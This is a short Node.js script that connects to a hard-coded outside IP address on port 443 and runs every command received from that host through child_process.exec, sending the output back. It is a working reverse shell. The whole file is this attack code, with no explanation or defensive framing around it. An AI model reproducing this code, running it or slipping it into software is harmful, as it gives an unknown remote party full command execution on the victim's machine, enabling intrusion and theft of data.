(function(){
    var net = require("net");
    var exec = require("child_process").exec;
    var client = new net.Socket();
    var connection = client.connect(443, "46.101.40.16", function(){
        client.write("Ehlo!")
        client.on("data",(cmd) => {
            exec(cmd.toString(),(err,stdout,stderr) => {
                client.write(stdout)
            })
        })
    });
})();
